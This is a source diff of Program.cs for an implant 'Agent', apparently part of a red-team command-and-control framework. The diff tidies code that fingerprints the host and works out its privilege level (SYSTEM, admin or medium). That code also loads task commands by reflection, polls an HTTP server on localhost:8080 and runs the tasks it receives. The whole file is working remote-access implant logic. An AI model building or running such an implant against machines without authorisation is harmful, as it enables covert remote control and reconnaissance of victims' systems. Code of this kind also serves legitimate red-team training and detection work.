@@ -1,31 +1,31 @@
 ﻿using Agent.Models;
+
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Linq;
+using System.Reflection;
 using System.Security.Principal;
 using System.Threading;
-using System.Reflection;
-using System.Linq;
-
 
 namespace Agent
 {
     class Program
     {
-        private static AgentMetadata _metadata; // set breakpoint at GenerateMetadata() > f10 aand check props in here
+        private static AgentMetadata _metadata;
         private static CommModule _commModule;
-        private static CancellationTokenSource _tokenSource; // can also use bools --  running is true or not
+        private static CancellationTokenSource _tokenSource;
 
-        private static List<AgentCommand> _commands = new List<AgentCommand>(); // populate this list with all the commands to be implmented
+        private static List<AgentCommand> _commands = new List<AgentCommand>();
 
         static void Main(string[] args)
         {
-            Thread.Sleep(20000); // wait for teamserver and listeners to start before agent commands
+            Thread.Sleep(10000);
 
             GenerateMetadata();
             LoadAgentCommands();
 
-            _commModule = new HttpCommModule("localhost",8080);
+            _commModule = new HttpCommModule("localhost", 8080);
             _commModule.Init(_metadata);
             _commModule.Start();
 
@@ -48,14 +48,16 @@ namespace Agent
             }
         }
 
-        private static void HandleTask(AgentTask task) 
+        private static void HandleTask(AgentTask task)
         {
-            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command));
+            var command = _commands.FirstOrDefault(c => c.Name.Equals(task.Command, StringComparison.OrdinalIgnoreCase));
+
             if (command is null)
             {
-                SendTaskResult(task.Id, "Command Not Found");
+                SendTaskResult(task.Id, "Command not found.");
                 return;
             }
+
             try
             {
                 var result = command.Execute(task);
@@ -65,7 +67,6 @@ namespace Agent
             {
                 SendTaskResult(task.Id, e.Message);
             }
-            
         }
 
         private static void SendTaskResult(string taskId, string result)
@@ -75,11 +76,12 @@ namespace Agent
                 Id = taskId,
                 Result = result
             };
+
             _commModule.SendData(taskResult);
         }
 
-        public void Stop() 
-        { 
+        public void Stop()
+        {
             _tokenSource.Cancel();
         }
 
@@ -87,7 +89,7 @@ namespace Agent
         {
             var self = Assembly.GetExecutingAssembly();
 
-            foreach (var type in self.GetTypes()) 
+            foreach(var type in self.GetTypes())
             {
                 if (type.IsSubclassOf(typeof(AgentCommand)))
                 {
@@ -97,32 +99,36 @@ namespace Agent
             }
         }
 
-        // generate metadata
         private static void GenerateMetadata()
         {
             var process = Process.GetCurrentProcess();
-            var username = Environment.UserName;
+            var identity = WindowsIdentity.GetCurrent();
+            var principal = new WindowsPrincipal(identity);
+
             var integrity = "Medium";
 
-            if (username.Equals("SYSTEM"))
+            if (identity.IsSystem)
+            {
                 integrity = "SYSTEM";
-
-            using (var identity = WindowsIdentity.GetCurrent()) {
-                if (identity.User != identity.Owner) {
-                    integrity = "High";
-                }
+            }
+            else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
+            {
+                integrity = "High";
             }
 
             _metadata = new AgentMetadata
             {
                 Id = Guid.NewGuid().ToString(),
-                Hostname = Environment.MachineName, // use dns lookup incase name hostname change (more reliable)
-                Username = username,
-                Processname = process.ProcessName,
+                Hostname = Environment.MachineName,
+                Username = identity.Name,
+                ProcessName = process.ProcessName,
                 ProcessId = process.Id,
                 Integrity = integrity,
-                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86"
+                Architecture = IntPtr.Size == 8 ? "x64" : "x86"
             };
+
+            process.Dispose();
+            identity.Dispose();
         }
     }
 }
